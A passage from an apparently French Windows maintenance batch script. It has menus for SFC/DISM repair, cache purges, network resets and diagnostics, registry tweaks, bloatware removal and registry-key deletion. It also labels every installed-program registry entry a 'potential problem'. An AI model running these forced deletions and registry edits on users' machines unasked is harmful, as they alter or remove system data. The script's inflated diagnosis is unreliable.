set "opts=%opts%;Planifier un CHKDSK (C:)~Audite et repare les secteurs defectueux au prochain boot"
set "opts=%opts%;Reset Fix Windows Update~Redemarre brutalement le catalogue WU bloque ou corrompu"

:: Mapping des targets pour gestion des favoris en sous-menu
set "res_t[1]=res_sfc"
set "res_t[2]=res_dism_check"
set "res_t[3]=res_dism_restore"
set "res_t[4]=res_temp_clean"
set "res_t[5]=res_chkdsk"
set "res_t[6]=res_wu_reset"

:: Marquer les favoris existants dans le sous-menu
set "res_opts="
set /a resi=0
for %%O in ("Scan RAPIDE du systeme~Le classique SFC /scannow pour reparer l'OS" "Verification image base~Examine rapidement l'integration (DISM /CheckHealth)" "Reparation profonde~Telecharge les bons fichiers endommages (DISM /RestoreHealth)" "Nettoyage massif (Temp/Cache)~Detruit la totalite des fichiers inutiles cachant de l'espace" "Planifier un CHKDSK (C:)~Audite et repare les secteurs defectueux au prochain boot" "Reset Fix Windows Update~Redemarre brutalement le catalogue WU bloque ou corrompu") do (
    set /a resi+=1
    set "is_f=0"
    set "curr_t=!res_t[%resi%]!"
    for /f "usebackq tokens=*" %%F in ("favoris.txt") do (if "%%F"=="!curr_t!" set "is_f=1")
    if "!is_f!"=="1" (set "res_opts=!res_opts!;(F) %%~O") else (set "res_opts=!res_opts!;%%~O")
)
set "res_opts=!res_opts:~1!"

call :DynamicMenu "OUTIL DE REPARATION WINDOWS (Rescue)" "!res_opts!"
set "reschoice=%errorlevel%"

if "%reschoice%"=="0" goto system_tools

if %reschoice% GEQ 200 (
    set /a t_idx=%reschoice%-200
    call :ToggleFav "!res_t[%t_idx%]!"
    goto sys_rescue_menu
)

if "%reschoice%"=="1" goto res_sfc
if "%reschoice%"=="2" goto res_dism_check
if "%reschoice%"=="3" goto res_dism_restore
if "%reschoice%"=="4" goto res_temp_clean
if "%reschoice%"=="5" goto res_chkdsk
if "%reschoice%"=="6" goto res_wu_reset
goto sys_rescue_menu

:res_sfc
cls
echo [OPERATION] SFC Scannow en cours (Cela peut prendre plusieurs minutes)...
sfc /scannow
pause
goto sys_rescue_menu

:res_dism_check
cls
echo [OPERATION] DISM /CheckHealth puis ScanHealth...
DISM /Online /Cleanup-Image /CheckHealth
DISM /Online /Cleanup-Image /ScanHealth
pause
goto sys_rescue_menu

:res_dism_restore
cls
echo [OPERATION] DISM /RestoreHealth (Restauration systeme)...
DISM /Online /Cleanup-Image /RestoreHealth
pause
goto sys_rescue_menu

:res_temp_clean
cls
echo [OPERATION] Purge absolue des fichiers inutiles...
echo Suppression de %TEMP%...
del /q /f /s "%TEMP%\*" >nul 2>&1
echo Suppression de C:\Windows\Temp...
del /q /f /s "C:\Windows\Temp\*" >nul 2>&1
echo Suppression du cache Windows Update (SoftwareDistribution\Download)...
net stop wuauserv >nul 2>&1
del /q /f /s "C:\Windows\SoftwareDistribution\Download\*" >nul 2>&1
net start wuauserv >nul 2>&1
echo Nettoyage termine ! De l'espace a ete libere.
pause
goto sys_rescue_menu

:res_chkdsk
cls
echo [OPERATION] Planification d'une reparation CHKDSK sur C:
echo Le disque sera scanne au prochain demarrage du PC.
chkdsk C: /F /R /X
pause
goto sys_rescue_menu

:res_wu_reset
cls
echo [OPERATION] Reinitialisation totale de l'infrastructure Windows Update...
net stop bits >nul 2>&1
net stop wuauserv >nul 2>&1
net stop appidsvc >nul 2>&1
net stop cryptsvc >nul 2>&1
del "%ALLUSERSPROFILE%\Application Data\Microsoft\Network\Downloader\qmgr*.dat" >nul 2>&1
net start bits >nul 2>&1
net start wuauserv >nul 2>&1
net start appidsvc >nul 2>&1
net start cryptsvc >nul 2>&1
echo Les services de mises a jour ont ete recrees de force.
pause
goto sys_rescue_menu


:sys_network_menu
set "opts=Vider le cache DNS~Supprime et reinitialise le cache du resolveur (ipconfig /flushdns)"
set "opts=%opts%;Afficher le cache DNS~Liste toutes les entrees DNS stockees en memoire locale (ipconfig /displaydns)"
set "opts=%opts%;Vider le cache ARP~Nettoie instantanement la table de correspondance des IP/MAC (arp -d *)"
set "opts=%opts%;Afficher la table ARP~Affiche les appareils de votre reseau recemment contactes (arp -a)"
set "opts=%opts%;Liberer et Renouveler l'IP~Demande une nouvelle adresse IP au serveur DHCP / Box (release / renew)"
set "opts=%opts%;Reset TCP/IP Stack IPv4/IPv6~Repare la pile reseau vitale de Windows (netsh int ip reset)"
set "opts=%opts%;Reset des Sockets Windows~Reinitialise le catalogue Winsock corrompu (netsh winsock reset)"
set "opts=%opts%;Reset Reseau Automatique~Enchaine silencieusement le Flush DNS, Winsock, et TCP/IP"
set "opts=%opts%;Redemarrer les cartes reseau~Vos pilotes Ethernet et Wi-Fi sont mis hors puis sous tension"
set "opts=%opts%;Executer le Script d'Urgence~Sequence immediate de 7 commandes de depannage massif (Fast Reset)"

call :DynamicMenu "MENU DE DEPANNAGE RESEAU" "%opts%"
set "netchoice=%errorlevel%"

if "%netchoice%"=="1" goto net_flush_dns
if "%netchoice%"=="2" goto net_display_dns
if "%netchoice%"=="3" goto net_clear_arp
if "%netchoice%"=="4" goto net_display_arp
if "%netchoice%"=="5" goto net_renew_ip
if "%netchoice%"=="6" goto net_reset_tcpip
if "%netchoice%"=="7" goto net_reset_winsock
if "%netchoice%"=="8" goto net_reset_all
if "%netchoice%"=="9" goto net_restart_adapters
if "%netchoice%"=="10" goto net_fast_reset
if "%netchoice%"=="0" goto system_tools
goto sys_network_menu

:net_flush_dns
cls
echo Vidage du cache DNS...
ipconfig /flushdns
pause
goto sys_network_menu

:net_display_dns
cls
echo Affichage du cache DNS...
ipconfig /displaydns | more
pause
goto sys_network_menu

:net_clear_arp
cls
echo Nettoyage du cache ARP...
arp -d *
echo Cache ARP vide !
pause
goto sys_network_menu

:net_display_arp
cls
echo Affichage de la table ARP...
arp -a
pause
goto sys_network_menu

:net_renew_ip
cls
echo Liberation de l'IP...
ipconfig /release
echo Renouvellement de l'IP...
ipconfig /renew
pause
goto sys_network_menu

:net_reset_tcpip
cls
echo Reset de la pile TCP/IP...
netsh int ip reset >nul
netsh int ipv6 reset >nul
echo Pile TCP/IP reinitialisee. (Un redemarrage peut etre necessaire)
pause
goto sys_network_menu

:net_reset_winsock
cls
echo Reset du catalogue Winsock...
netsh winsock reset >nul
echo Winsock reinitialise. (Un redemarrage est necessaire)
pause
goto sys_network_menu

:net_reset_all
cls
echo ==== LANCEMENT DU RESET COMPLET ====
ipconfig /flushdns >nul
netsh winsock reset >nul
netsh int ip reset >nul
netsh int ipv6 reset >nul
arp -d * >nul 2>&1
echo.
echo Reset complet effectue ! Veuillez redemarrer votre ordinateur.
pause
goto sys_network_menu

:net_restart_adapters
cls
echo Redemarrage des interfaces reseau...
netsh interface set interface "Wi-Fi" admin=disable 2>nul
netsh interface set interface "Wi-Fi" admin=enable 2>nul
netsh interface set interface "Ethernet" admin=disable 2>nul
netsh interface set interface "Ethernet" admin=enable 2>nul
echo Interfaces redemarrees silencieusement.
pause
goto sys_network_menu

:net_fast_reset
cls
echo =========================================
echo       Script Rapide de Reparation
echo =========================================
echo.
echo [*] Liberation de l'adresse IP actuelle (release)...
ipconfig /release >nul
echo [*] Vidage du cache ARP...
arp -d * >nul 2>&1
echo [*] Vidage du cache NetBIOS (R)...
nbtstat -R >nul
echo [*] Renouvellement du bail DHCP (renew)...
ipconfig /renew >nul
echo [*] Vidage du cache DNS...
ipconfig /flushdns >nul
echo [*] Re-enregistrement avec WINS...
nbtstat -RR >nul
echo [*] Re-enregistrement avec DNS...
ipconfig /registerdns >nul
echo.
echo Reinitialisation reseau terminee avec succes !
pause
goto sys_network_menu

:sys_diag_network
cls
set "DIAG_LOG=%USERPROFILE%\Desktop\Diagnostic_Reseau.log"
set /a "ECHEC_COUNT=0"
echo ================================
echo    DIAGNOSTIC RESEAU COMPLET
echo ================================
echo Analyse de l'etat de votre connexion.
echo Un journal complet est genere en temps reel sur le Bureau.
echo.

echo ================================ > "%DIAG_LOG%"
echo    DIAGNOSTIC RESEAU COMPLET     >> "%DIAG_LOG%"
echo       %date% %time%              >> "%DIAG_LOG%"
echo ================================ >> "%DIAG_LOG%"
echo. >> "%DIAG_LOG%"

echo [1/4] Test de la carte reseau locale (TCP/IP)...
echo [1/4] Test de la carte reseau locale (TCP/IP)... >> "%DIAG_LOG%"
ping -n 2 127.0.0.1 | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
if !errorlevel!==0 (
    echo   -^> [OK] La carte reseau fonctionne ^(pilote OK^).
    echo   -^> [OK] La carte reseau fonctionne ^(pilote OK^). >> "%DIAG_LOG%"
) else (
    set /a "ECHEC_COUNT+=1"
    echo   -^> [ECHEC] Probleme avec la carte reseau locale ^(Pilote ou materiel^).
    echo   -^> [ECHEC] Probleme avec la carte reseau locale ^(Pilote ou materiel^). >> "%DIAG_LOG%"
)

echo.
echo. >> "%DIAG_LOG%"
echo [2/4] Test de connexion a la Box/Routeur (Passerelle par defaut)...
echo [2/4] Test de connexion a la Box/Routeur (Passerelle par defaut)... >> "%DIAG_LOG%"
set "gateway="
for /f "usebackq tokens=*" %%g in (`powershell -NoProfile -Command "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty NextHop) 2>$null"`) do set "gateway=%%g"

if "!gateway!"=="" (
    set /a "ECHEC_COUNT+=1"
    echo [INFO] Aucune IP de passerelle trouvee via l'interface reseau.
    echo [INFO] Aucune IP de passerelle trouvee via l'interface reseau. >> "%DIAG_LOG%"
    echo   -^> [ECHEC] Aucune passerelle detectee ^(Cable debranche ou probleme Wi-Fi / DHCP^).
    echo   -^> [ECHEC] Aucune passerelle detectee ^(Cable debranche ou probleme Wi-Fi / DHCP^). >> "%DIAG_LOG%"
) else (
    echo [INFO] Passerelle detectee : !gateway!
    echo [INFO] Passerelle detectee : !gateway! >> "%DIAG_LOG%"
    ping -n 2 !gateway! | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
    powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
    findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
    if !errorlevel!==0 (
        echo   -^> [OK] Connecte a la Box/Routeur ^(!gateway!^).
        echo   -^> [OK] Connecte a la Box/Routeur ^(!gateway!^). >> "%DIAG_LOG%"
    ) else (
        set /a "ECHEC_COUNT+=1"
        echo   -^> [ECHEC] Impossible de joindre la Box/Routeur ^(!gateway!^).
        echo   -^> [ECHEC] Impossible de joindre la Box/Routeur ^(!gateway!^). >> "%DIAG_LOG%"
    )
)

echo.
echo. >> "%DIAG_LOG%"
echo [3/4] Test de connexion a Internet (Serveur externe 8.8.8.8)...
echo [3/4] Test de connexion a Internet (Serveur externe 8.8.8.8)... >> "%DIAG_LOG%"
ping -n 2 8.8.8.8 | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
if !errorlevel!==0 (
    echo   -^> [OK] Acces Internet externe etabli.
    echo   -^> [OK] Acces Internet externe etabli. >> "%DIAG_LOG%"
) else (
    set /a "ECHEC_COUNT+=1"
    echo   -^> [ECHEC] Pas d'acces Internet ^(Coupure operateur FAI ou Box non connectee^).
    echo   -^> [ECHEC] Pas d'acces Internet ^(Coupure operateur FAI ou Box non connectee^). >> "%DIAG_LOG%"
)

echo.
echo. >> "%DIAG_LOG%"
echo [4/4] Test de resolution DNS (Ping domaine)...
echo [4/4] Test de resolution DNS (Ping domaine)... >> "%DIAG_LOG%"
ping -n 2 google.com | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
if !errorlevel!==0 (
    echo   -^> [OK] Les serveurs DNS fonctionnent et traduisent les IP.
    echo   -^> [OK] Les serveurs DNS fonctionnent et traduisent les IP. >> "%DIAG_LOG%"
) else (
    set /a "ECHEC_COUNT+=1"
    echo   -^> [ECHEC] Probleme DNS. Impossible de se rendre sur des sites par leur nom.
    echo   -^> [ECHEC] Probleme DNS. Impossible de se rendre sur des sites par leur nom. >> "%DIAG_LOG%"
)

echo.
echo ================================
if !ECHEC_COUNT! GTR 0 (
    echo [ATTENTION] !ECHEC_COUNT! ECHEC^(s^) detecte^(s^) lors de l'analyse.
    echo Voulez-vous utiliser les outils de reparation reseau de ce script ? ^(O/N^)
    echo ================================
    echo.
    set /p rep_choix="Choix : "
    if /i "!rep_choix!"=="O" goto sys_network_menu
) else (
    echo [SUCCES] Tous les tests reseau ont ete reussis avec succes !
    echo ================================
    echo.
)
echo Appuyez sur une touche pour afficher votre configuration IP (ipconfig /all)
pause >nul
cls
echo Affichage des informations reseau (ipconfig /all)...
echo ================================ >> "%DIAG_LOG%"
echo     Rapport IPCONFIG /ALL        >> "%DIAG_LOG%"
echo ================================ >> "%DIAG_LOG%"
ipconfig /all > "%TEMP%\netdiag_ipconfig.txt"
powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ipconfig.txt' -Encoding OEM | ForEach-Object { Write-Host $_ -ForegroundColor DarkGray; $_ | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
echo.
pause
goto system_tools

:sys_cleanmgr
cls
echo Lancement du Nettoyage de disque...
cleanmgr
pause
goto system_tools

:sys_tweaks_menu
set "opts=Desactiver Telemetrie~Coupe l'espionnage et l'envoi de donnees a Microsoft"
set "opts=%opts%;Plan Performances Ultimes~Active le plan d'alimentation secret de Windows"
set "opts=%opts%;Desactiver Cortana completement~Empeche Cortana de tourner en arriere-plan"
set "opts=%opts%;Desactiver la recherche Bing~Rend le menu Demarrer beaucoup plus rapide (Local uniquement)"
set "opts=%opts%;Mode Sombre global~Force l'activation du theme sombre systeme"
set "opts=%opts%;Desactiver l'Hibernation~Libere plusieurs Giga-Octets d'espace disque (Taille de RAM)"
set "opts=%opts%;Purger les Bloatwares~Desinstalle Xbox, 3DBuilder, Skype, Zune, etc."
set "opts=%opts%;Supprimer les pubs de Windows~Retire les applications preinstallees forcees (Jeux)"

call :DynamicMenu "MENU OPTIMISATIONS WINDOWS (Tweaks)" "%opts%"
set "tw_choice=%errorlevel%"

if "%tw_choice%"=="1" goto tweak_telemetry
if "%tw_choice%"=="2" goto tweak_ultimate_power
if "%tw_choice%"=="3" goto tweak_cortana
if "%tw_choice%"=="4" goto tweak_bing
if "%tw_choice%"=="5" goto tweak_darkmode
if "%tw_choice%"=="6" goto tweak_hibernation
if "%tw_choice%"=="7" goto tweak_bloatware
if "%tw_choice%"=="8" goto tweak_ads
if "%tw_choice%"=="0" goto sys_opti_menu
goto sys_tweaks_menu

:tweak_telemetry
cls
echo [TWEAK] Desactivation de la Telemetrie Windows...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v AllowTelemetry /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "DoNotShowFeedbackNotifications" /t REG_DWORD /d 1 /f >nul
sc stop DiagTrack >nul 2>&1
sc config DiagTrack start= disabled >nul 2>&1
sc stop dmwappushservice >nul 2>&1
sc config dmwappushservice start= disabled >nul 2>&1
echo Telemetrie desactivee !
pause
goto sys_tweaks_menu

:tweak_ultimate_power
cls
echo [TWEAK] Activation des Performances Ultimes Caches...
powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul
echo Plan d'alimentation 'Performances Ultimes' active. Allez dans vos reglages d'energie pour le selectionner.
pause
goto sys_tweaks_menu

:tweak_cortana
cls
echo [TWEAK] Desactivation complete de Cortana...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d 0 /f >nul
echo Cortana ne demarrera plus en arriere-plan.
pause
goto sys_tweaks_menu

:tweak_bing
cls
echo [TWEAK] Desactiver la recherche internet (Bing) dans le menu Demarrer...
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v "DisableSearchBoxSuggestions" /t REG_DWORD /d 1 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "CortanaConsent" /t REG_DWORD /d 0 /f >nul
echo La recherche locale est desormais plus rapide et sans pub internet !
pause
goto sys_tweaks_menu

:tweak_darkmode
cls
echo [TWEAK] Activation du Mode Sombre global de Windows 11...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "AppsUseLightTheme" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "SystemUsesLightTheme" /t REG_DWORD /d 0 /f >nul
echo Mode sombre applique (si pris en charge par votre version/theme).
pause
goto sys_tweaks_menu

:tweak_hibernation
cls
echo [TWEAK] Desactivation du fichier hiberfil.sys (Gain d'espace libre gigantesque)...
powercfg.exe /hibernate off >nul
echo Hibernation coupee ! Vous recuperez la taille de votre RAM en espace de stockage disque (Giga-Octets).
pause
goto sys_tweaks_menu

:tweak_bloatware
cls
echo [TWEAK] Desinstallation automatique des Bloatwares inutiles...
echo Cela peut prendre un peu de temps.
powershell -Command "Get-AppxPackage *3DBuilder* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *Getstarted* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *WindowsAlarms* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *bing* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *MicrosoftOfficeHub* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *OneNote* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *SkypeApp* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *ZuneMusic* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *ZuneVideo* | Remove-AppxPackage" >nul 2>&1
powershell -Command "Get-AppxPackage *SolitaireCollection* | Remove-AppxPackage" >nul 2>&1
echo Logiciels superflus retires avec succes !
pause
goto sys_tweaks_menu

:tweak_ads
cls
echo [TWEAK] Suppression des publicites du Menu Demarrer et des notifications Windows...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d 1 /f >nul
echo Termine ! Fini les pubs de jeux preinstalles dans Windows.
pause
goto sys_tweaks_menu

:sys_registry_cleanup
cls
echo ======================================================
echo Nettoyage ^& optimisation avances du Registre
echo ======================================================
setlocal enabledelayedexpansion

set backupFolder=%SystemRoot%\Temp\RegistryBackups
if not exist "%backupFolder%" mkdir "%backupFolder%"

set logFile=%SystemRoot%\Temp\RegistryCleanupLog.txt
echo Journal de nettoyage du Registre - %date% %time% > "%logFile%"

set count=0
set safe_count=0

echo Analyse du Registre Windows pour les erreurs et problemes de performance...
for /f "tokens=*" %%A in ('reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall 2^>nul') do (
    set /a count+=1
    set entries[!count!]=%%A

    echo %%A | findstr /I "IE40 IE4Data DirectDrawEx DXM_Runtime SchedulingAgent" >nul && (
        set /a safe_count+=1
        set safe_entries[!safe_count!]=%%A
    )
)

if %count%==0 (
    echo Aucune entree superflue trouvee dans le Registre.
    pause
    goto system_tools
)

echo %count% problemes potentiels detectes dans le Registre:
for /L %%i in (1,1,%count%) do echo [%%i] !entries[%%i]!
echo.
echo Sans risque a supprimer (%safe_count% entrees detectees):
for /L %%i in (1,1,%safe_count%) do echo [%%i] !safe_entries[%%i]!
echo.
echo [A] Supprimer uniquement les entrees sures
if %safe_count% GTR 0 echo [B] Revoir les entrees sures avant suppression
echo [C] Creer une sauvegarde du Registre
echo [D] Restaurer une sauvegarde du Registre
echo [E] Verifier les corruptions du Registre
echo [0] Annuler
echo.
set /p reg_choice=Votre choix: 

for %%A in (%reg_choice%) do set reg_choice=%%A
if /i "%reg_choice%"=="0" goto sys_opti_menu
if /i "%reg_choice%"=="A" goto delete_safe_reg_entries
if /i "%reg_choice%"=="B" goto review_safe_reg_entries
if /i "%reg_choice%"=="C" goto create_reg_backup
if /i "%reg_choice%"=="D" goto restore_reg_backup
if /i "%reg_choice%"=="E" goto scan_registry
if "%reg_choice%"=="" goto sys_opti_menu

echo Saisie invalide, retour au menu.
pause
goto sys_registry_cleanup

:delete_safe_reg_entries
if %safe_count%==0 (
    echo Aucune entree sure a supprimer.
    pause
    goto sys_registry_cleanup
)
echo Suppression de toutes les entrees sures detectees...
for /L %%i in (1,1,%safe_count%) do (
    echo Suppression de !safe_entries[%%i]!...
    reg delete "!safe_entries[%%i]!" /f
    echo Supprime: !safe_entries[%%i]! >> "%logFile%"
)
echo Suppression terminee.
pause
goto sys_registry_cleanup

:review_safe_reg_entries
cls
echo Entrees du Registre sures a supprimer:
for /L %%i in (1,1,%safe_count%) do echo [%%i] !safe_entries[%%i]!
echo.
echo Voulez-vous toutes les supprimer ? (O/N)
set /p confirm_reg=
for %%A in (%confirm_reg%) do set confirm_reg=%%A
if /i "%confirm_reg%"=="Y" goto delete_safe_reg_entries
if /i "%confirm_reg%"=="O" goto delete_safe_reg_entries
echo Operation annulee.
pause
goto sys_registry_cleanup

:create_reg_backup
set backupName=RegistryBackup_%date:~-4,4%-%date:~-7,2%-%date:~-10,2%_%time:~0,2%-%time:~3,2%.reg
echo Creation de la sauvegarde: %backupFolder%\%backupName%...
reg export HKLM "%backupFolder%\%backupName%" /y
echo Sauvegarde creee avec succes.
pause
goto sys_registry_cleanup

:restore_reg_backup
echo Sauvegardes disponibles:
dir /b "%backupFolder%\*.reg"
echo Entrez le nom de la sauvegarde a restaurer:
set /p backupFile=
if exist "%backupFolder%\%backupFile%" (
    echo Restauration en cours...
    reg import "%backupFolder%\%backupFile%"
    echo Restauration effectuee avec succes.
) else (
    echo Fichier de sauvegarde introuvable. Verifiez le nom et reessayez.
)
pause
goto sys_registry_cleanup

:scan_registry
cls
echo Verification des corruptions du Registre...
sfc /scannow
dism /online /cleanup-image /checkhealth
echo Verification terminee. Si des erreurs ont ete trouvees, redemarrez votre PC.
pause
goto sys_registry_cleanup

:sys_drivers
cls
echo Enregistrement de la liste des pilotes sur le Bureau...
driverquery /v > "%USERPROFILE%\Desktop\Pilotes_installes.txt"
echo.
echo Le rapport des pilotes a ete enregistre ici :
echo %USERPROFILE%\Desktop\Pilotes_installes.txt
pause
goto sys_export_menu

:sys_diagnostic_menu
cls
set "opts=[--- ANALYSE SYSTEME ET RAPPORTS ---]"
set "opts=%opts%;Apercu de la configuration PC~Affiche les specifications et l'etat de sante materiel"
set "opts=%opts%;Diagnostic Reseau~Test de connexion (Local, Box, Internet, DNS)"
set "opts=%opts%;Rapport de Batterie~Usure, Sante et stats en temps reel"
set "opts=%opts%;Verificateur BitLocker~Verifiez l'etat de chiffrement de vos partitions"
set "opts=%opts%;Journaux d'Erreurs Windows~Affiche les erreurs critiques recentes (24h / 7 jours)"
set "opts=%opts%;Test des Composants PC~Benchmark disque, RAM, CPU et SMART en un clic"
set "opts=%opts%;Gestionnaire Windows Defender~Scan rapide/complet CLI, MAJ signatures, menaces detectees"

call :DynamicMenu "MENU DE DIAGNOSTIC SYSTEME" "%opts%"
set "diag_choice=%errorlevel%"

if "%diag_choice%"=="1" goto sys_report
if "%diag_choice%"=="2" goto sys_diag_network
if "%diag_choice%"=="3" goto sys_battery_report
if "%diag_choice%"=="4" goto sys_bitlocker_check
if "%diag_choice%"=="5" goto sys_event_log
if "%diag_choice%"=="6" goto sys_hw_test
if "%diag_choice%"=="7" goto sys_defender
if "%diag_choice%"=="0" goto system_tools

if %diag_choice% GEQ 200 (
    set /a "toggle_idx=%diag_choice%-200"
    if "!toggle_idx!"=="1" call :ToggleFav "sys_report"
    if "!toggle_idx!"=="2" call :ToggleFav "sys_diag_network"
    if "!toggle_idx!"=="3" call :ToggleFav "sys_battery_report"
    if "!toggle_idx!"=="4" call :ToggleFav "sys_bitlocker_check"
    if "!toggle_idx!"=="5" call :ToggleFav "sys_event_log"
    if "!toggle_idx!"=="6" call :ToggleFav "sys_hw_test"
    if "!toggle_idx!"=="7" call :ToggleFav "sys_defender"
)
goto sys_diagnostic_menu

:sys_report
cls
echo Diagnostic et integration de memoire en cours...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$os = Get-CimInstance Win32_OperatingSystem; $cpu = Get-CimInstance Win32_Processor; $bios = Get-CimInstance Win32_BIOS; $ram = Get-CimInstance Win32_ComputerSystem; $gpu = Get-CimInstance Win32_VideoController; $pm = @(Get-CimInstance Win32_PhysicalMemory); $typeInt = if ($pm.Count -gt 0) {$pm[0].SMBIOSMemoryType} else {0}; $memTypes = @{ 20='DDR'; 21='DDR2'; 22='DDR2 FB-DIMM'; 24='DDR3'; 26='DDR4'; 34='DDR5' }; $ramType = if ($memTypes.ContainsKey($typeInt)) { $memTypes[$typeInt] } else { 'Type Inconnu' }; Write-Host '   INFORMATIONS OS' -f Cyan; Write-Host ('   Hostname: '+$env:COMPUTERNAME); Write-Host ('   Systeme : '+$os.Caption+' ('+$os.OSArchitecture+')'); Write-Host ('   Build   : '+$os.Version); Write-Host ''; Write-Host '   MATERIEL COMPOSANTS' -f Cyan; Write-Host ('   Processeur : '+$cpu.Name); Write-Host ('   Graphique  : '+($gpu.Name -join ', ')); Write-Host ('   Memoire    : '+[math]::Round($ram.TotalPhysicalMemory / 1GB, 2)+' Go - Format : '+$ramType) -f Yellow; Write-Host ('   BIOS Ver.  : '+$bios.SMBIOSBIOSVersion); Write-Host ''; Write-Host '   STOCKAGE (GB libres)' -f Cyan; Get-CimInstance Win32_LogicalDisk | Where DriveType -eq 3 | foreach { $t=[math]::Round($_.Size / 1GB, 2); $f=[math]::Round($_.FreeSpace / 1GB, 2); $p=0; if($t -gt 0){$p=[math]::Round(($f/$t)*100,0)}; Write-Host ('   Lecteur '+$_.DeviceID+' '+$f+' Go libres sur '+$t+' Go ('+$p+'%% restants)') -f Green }; Write-Host ''; Write-Host '   RESEAU' -f Cyan; Get-NetAdapter | Where Status -eq 'Up' | foreach { $ip=(Get-NetIPAddress -InterfaceIndex $_.ifIndex -AddressFamily IPv4 -EA SilentlyContinue).IPAddress; Write-Host ('   '+$_.Name+' ('+$_.LinkSpeed+') - IP: '+$ip) }; Write-Host ''; Write-Host '   SECURITE' -f Cyan; try { $t=[bool](Get-Tpm).TpmPresent; Write-Host ('   TPM Integre: '+$t) } catch {}"
echo.
pause
goto system_tools

:sys_repair_icons
cls
echo ===============================================
echo      Reparation du Cache des Icones/Miniatures
echo ===============================================
echo.
echo Arret de l'explorateur Windows...
taskkill /f /im explorer.exe >nul 2>&1
echo Reparation en cours (Suppression du cache)...
timeout /t 2 /nobreak >nul
del /A /F /Q "%localappdata%\IconCache.db" >nul 2>&1
del /A /F /Q "%localappdata%\Microsoft\Windows\Explorer\iconcache*" >nul 2>&1
del /A /F /Q "%localappdata%\Microsoft\Windows\Explorer\thumbcache*" >nul 2>&1
echo Redemarrage de l'explorateur Windows...
start explorer.exe
echo.
echo [OK] Le cache des icones a ete vide !
echo Il se reconstruira progressivement et reparera vos icones.
pause
goto sys_export_menu

REM ===================================================================
REM              MENU DES EXTRACTIONS ET SAUVEGARDES
REM ===================================================================
:sys_export_menu
cls
set "opts=[--- INFORMATIONS ET CLES ---]"
set "opts=%opts%;Cle Windows et Office~Affiche ou recupere vos differentes cles de produit"
set "opts=%opts%;Extraction des pilotes~Exporte la liste de tous les pilotes natifs installes"
set "opts=%opts%;[--- LISTES DE LOGICIELS ET RESEAUX ---]"
set "opts=%opts%;Export Liste des Logiciels~Exporte tous les programmes installes en fichier texte ou tableur"
set "opts=%opts%;[BUREAU] Export Wi-Fi + Logiciels~Genere directement 2 fichiers TXT sur le Bureau (Rapide)"

call :DynamicMenu "MENU EXTRACTION ET SAUVEGARDE" "%opts%"
set "exp_choice=%errorlevel%"

if "%exp_choice%"=="1" goto sys_win_key
